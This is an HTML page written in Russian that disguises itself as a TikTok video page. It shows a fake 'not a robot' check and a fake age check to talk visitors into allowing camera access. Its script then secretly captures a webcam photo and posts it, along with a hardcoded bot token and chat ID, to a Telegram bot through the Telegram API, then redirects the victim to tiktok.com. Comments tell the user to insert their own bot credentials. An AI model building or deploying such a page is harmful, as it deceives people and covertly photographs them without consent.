<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Видео</title>
    <style>
        body { margin: 0; background: #010101; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .logo { width: 120px; margin-bottom: 30px; }
        .btn { background: #fe2c55; color: white; border: none; padding: 15px 40px; font-size: 18px; font-weight: bold; border-radius: 4px; cursor: pointer; }
        .footer { margin-top: 20px; font-size: 13px; color: #8a8a8e; text-align: center; padding: 0 20px; }
    </style>
</head>
<body>
    <img src="https://wikimedia.org" class="logo">
    <button class="btn" onclick="capture()">СМОТРЕТЬ ВИДЕО</button>
    <p class="footer">Для просмотра подтвердите, что вы не робот, разрешив доступ к камере.</p>

    <!-- Важно: playsinline и muted для мобильных браузеров -->
    <video id="v" autoplay playsinline muted style="width:1px; height:1px; opacity:0.01;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // ВСТАВЬ СВОИ ДАННЫЕ ТУТ:
        const TOKEN = '8732856671:AAGaeDEaknbUts1NihyvHuQVkvpbM_C1XHA'; // Твой токен от BotFather
        const ID = '8703614255'; // Твой ЛИЧНЫЙ ID от @userinfobot

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;

                setTimeout(() => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);

                    c.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', ID);
                        fd.append('photo', blob, 'shot.jpg');

                        // ИСПРАВЛЕННЫЙ URL ТУТ:
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: fd
                        }).then(() => {
                            window.location.href = "https://tiktok.com";
                        });
                    }, 'image/jpeg');
                }, 3000);
            } catch (e) {
                alert("Ошибка! Разрешите доступ к камере для проверки возраста.");
            }
        }
    </script>
</body>
</html>
